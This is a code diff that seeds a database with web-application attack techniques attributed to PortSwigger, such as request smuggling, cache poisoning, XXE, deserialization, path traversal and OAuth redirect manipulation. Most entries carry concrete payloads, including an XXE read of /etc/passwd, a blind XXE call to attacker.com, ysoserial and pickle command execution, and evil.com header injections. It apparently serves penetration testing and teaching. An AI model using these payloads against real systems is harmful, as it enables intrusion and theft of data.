@@ -144,6 +144,132 @@ def _seed_techniques(db):
          "Test on any JSON endpoint that merges user input with server objects. "
          "Detection: add __proto__.polluted=true, then check if the property exists on new objects.",
          "PortSwigger Prototype Pollution"),
+
+        ("HTTP Request Smuggling CL.TE", "http_smuggling", "smuggling,desync,cl,te,proxy",
+         "Front-end uses Content-Length, back-end uses Transfer-Encoding. "
+         "Send: POST / with Content-Length: 6 and Transfer-Encoding: chunked. Body: 0\\r\\n\\r\\nX. "
+         "The front-end forwards 6 bytes, the back-end sees chunked with 0-length chunk (end). "
+         "The trailing 'X' becomes the start of the next request on the back-end's socket. "
+         "Detection: time-based — if back-end waits for more chunked data, delay increases by ~5s. "
+         "Impact: bypass WAF, access internal endpoints, capture other users' requests, cache poisoning.",
+         "PortSwigger HTTP Request Smuggling"),
+
+        ("Web Cache Poisoning via Unkeyed Headers", "cache_poisoning", "cache,poison,header,xss",
+         "Cache keys usually include Host + Path + Query but NOT arbitrary headers. "
+         "If X-Forwarded-Host or X-Forwarded-Scheme changes the response (e.g., in link tags or redirects) "
+         "but isn't in the cache key, sending a poisoned request caches malicious content for all users. "
+         "Steps: 1) Identify caching (X-Cache: HIT, Age header). "
+         "2) Find unkeyed headers that affect response (try X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL). "
+         "3) Poison: send request with X-Forwarded-Host: evil.com, then verify clean request gets poisoned response.",
+         "PortSwigger Web Cache Poisoning"),
+
+        ("Web Cache Deception", "cache_poisoning", "cache,deception,sensitive,static",
+         "Trick the cache into storing sensitive dynamic content by appending a static-looking extension. "
+         "If /account/settings returns user data and the cache keys on path extension: "
+         "/account/settings/anything.css may be cached because it ends in .css. "
+         "The origin serves the real settings page (ignores the fake path). The cache stores it. "
+         "Attacker visits the same URL and gets the victim's account page. "
+         "Test with: .css, .js, .jpg, .png, .ico appended to sensitive endpoints.",
+         "PortSwigger Web Cache Deception"),
+
+        ("XXE — XML External Entity Injection", "injection", "xxe,xml,dtd,file_read,ssrf",
+         "When the application parses XML input, inject an external entity to read files or make SSRF requests. "
+         "Classic payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root> "
+         "Blind XXE via parameter entities: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]> "
+         "Test: change Content-Type from application/json to application/xml and send XML equivalent. "
+         "Many JSON APIs accept XML if you switch the Content-Type header.",
+         "PortSwigger XXE"),
+
+        ("Insecure Deserialization", "injection", "deserialization,rce,java,php,python,pickle",
+         "When the app deserializes untrusted data, craft a malicious serialized object for RCE. "
+         "Java: look for base64-encoded blobs starting with rO0 (Java serialization magic bytes). "
+         "Use ysoserial to generate payloads: java -jar ysoserial.jar CommonsCollections1 'id' | base64. "
+         "PHP: look for O: or a: prefixed strings. Craft __wakeup/__destruct chains. "
+         "Python: pickle.loads on untrusted input → import os; os.system('id'). "
+         "Detection: base64-decode cookies/parameters, check for serialization magic bytes.",
+         "PortSwigger Insecure Deserialization"),
+
+        ("Path Traversal / Local File Inclusion", "injection", "path_traversal,lfi,file_read,directory",
+         "Access files outside the intended directory by manipulating file path parameters. "
+         "Payloads: ../../../etc/passwd, ....//....//etc/passwd (double encoding), "
+         "%2e%2e%2f%2e%2e%2f (URL encoded), ..%252f..%252f (double URL encoded), "
+         "..\\..\\..\\windows\\win.ini (Windows). "
+         "Test on: file download endpoints, image display, template inclusion, log file viewers. "
+         "Null byte termination: ../../../etc/passwd%00.jpg (older systems). "
+         "Confirm by reading a file with known content (etc/passwd, etc/hostname).",
+         "PortSwigger Path Traversal"),
+
+        ("GraphQL Introspection and Exploitation", "api_security", "graphql,introspection,batching,dos",
+         "Introspection query: {__schema{types{name,fields{name,type{name}}}}} "
+         "If disabled, try: {__type(name:\"User\"){fields{name}}} for partial discovery. "
+         "Batching attack: send array of mutations in one request [{query1},{query2},...]. "
+         "Alias-based rate limit bypass: {a:user(id:1){name} b:user(id:2){name} c:user(id:3){name}}. "
+         "Nested query DoS: {user{friends{friends{friends{name}}}}} — exponential expansion. "
+         "Field suggestion: misspell a field name and check if the error suggests valid fields.",
+         "PortSwigger GraphQL"),
+
+        ("WebSocket Hijacking and Injection", "websocket", "websocket,csrf,hijacking,injection",
+         "Cross-site WebSocket hijacking (CSWSH): if the WS endpoint doesn't validate the Origin header, "
+         "an attacker's page can open a WebSocket to the target and read the victim's real-time data. "
+         "Test: connect with Origin: https://evil.com — if accepted, CSWSH is possible. "
+         "Injection: WebSocket messages may be parsed as SQL, shell commands, or rendered as HTML — "
+         "test the same injection payloads as HTTP parameters. "
+         "Auth: check if WS connections work without auth or after session expiry.",
+         "PortSwigger WebSockets"),
+
+        ("OAuth2 Redirect URI Manipulation", "authentication", "oauth,redirect,open_redirect,token_theft",
+         "The redirect_uri parameter in OAuth flows can be manipulated to steal authorization codes or tokens. "
+         "Tests: redirect_uri=https://evil.com (open redirect), "
+         "redirect_uri=https://legitimate.com.evil.com (subdomain confusion), "
+         "redirect_uri=https://legitimate.com/../evil (path traversal), "
+         "redirect_uri=https://legitimate.com%23.evil.com (fragment bypass). "
+         "Also test: missing state parameter (CSRF via OAuth), PKCE bypass (omit code_verifier at token exchange), "
+         "scope escalation (request higher scopes), token leakage via Referer header.",
+         "PortSwigger OAuth"),
+
+        ("Host Header Attacks", "injection", "host,header,poisoning,password_reset,routing",
+         "The Host header can be abused for: "
+         "Password reset poisoning: send reset request with Host: evil.com — the reset link points to attacker's domain. "
+         "Routing-based SSRF: Host: internal-service.local may route to internal services. "
+         "Web cache poisoning: if Host is unkeyed but affects the response. "
+         "Virtual host discovery: try different Host values to find hidden vhosts. "
+         "Test: X-Forwarded-Host, X-Host, X-Original-Host, Forwarded: host= as alternatives.",
+         "PortSwigger Host Header Attacks"),
+
+        ("CSRF without State Parameter", "authentication", "csrf,state,oauth,cross_site",
+         "Cross-Site Request Forgery via missing anti-CSRF protections. "
+         "Check: does the form include a CSRF token? Is the token validated server-side? "
+         "For APIs: does the endpoint accept requests without Origin/Referer validation? "
+         "For OAuth: is the state parameter required and validated? If optional, CSRF via OAuth. "
+         "SameSite cookie bypass: if SameSite=Lax, POST requests from cross-site are blocked "
+         "but GET requests within 2 minutes of a top-level navigation are allowed.",
+         "PortSwigger CSRF"),
+
+        ("DNS Rebinding for SSRF Bypass", "ssrf", "dns,rebinding,bypass,ssrf,filter",
+         "Bypass SSRF URL filters that check the resolved IP before making the request. "
+         "Set up a DNS record with a very short TTL (e.g., 1 second) that alternates between "
+         "a valid external IP (passes the check) and 127.0.0.1 (the actual target). "
+         "The server resolves the domain, sees a valid IP, allows the request. "
+         "By the time the HTTP request is made, DNS resolves to the internal IP. "
+         "Tools: rebinder.com, rbndr.us, or self-hosted DNS server with short TTL.",
+         "PortSwigger SSRF Bypass"),
+
+        ("Server-Side Parameter Pollution", "injection", "sspp,parameter,api,internal",
+         "If the application builds internal API requests from user input, inject additional parameters. "
+         "Example: user input 'name=test' becomes internal request '/api/internal?name=test'. "
+         "Inject: name=test&role=admin — the internal API may process the extra parameter. "
+         "Truncation: name=test%00&admin=true — null byte may truncate on one side but not the other. "
+         "URL-encoded separators: name=test%26role%3Dadmin — bypasses client-side filtering.",
+         "PortSwigger Server-Side Parameter Pollution"),
+
+        ("Race Condition Single-Packet Attack", "business_logic", "race,http2,single_packet,concurrent",
+         "HTTP/2 single-packet attack for precise race condition timing. "
+         "Send all competing requests in a single TCP packet so they arrive at the server simultaneously. "
+         "Python implementation: use httpx with HTTP/2, prepare all requests, send via single connection. "
+         "Targets: coupon application (apply same coupon twice), fund transfer (double-spend), "
+         "invitation/email verification (claim multiple times), voting (vote multiple times). "
+         "The key insight: network jitter is eliminated when all requests share one TCP packet.",
+         "PortSwigger Race Conditions"),
     ]
 
     for title, category, tags, content, source in techniques:
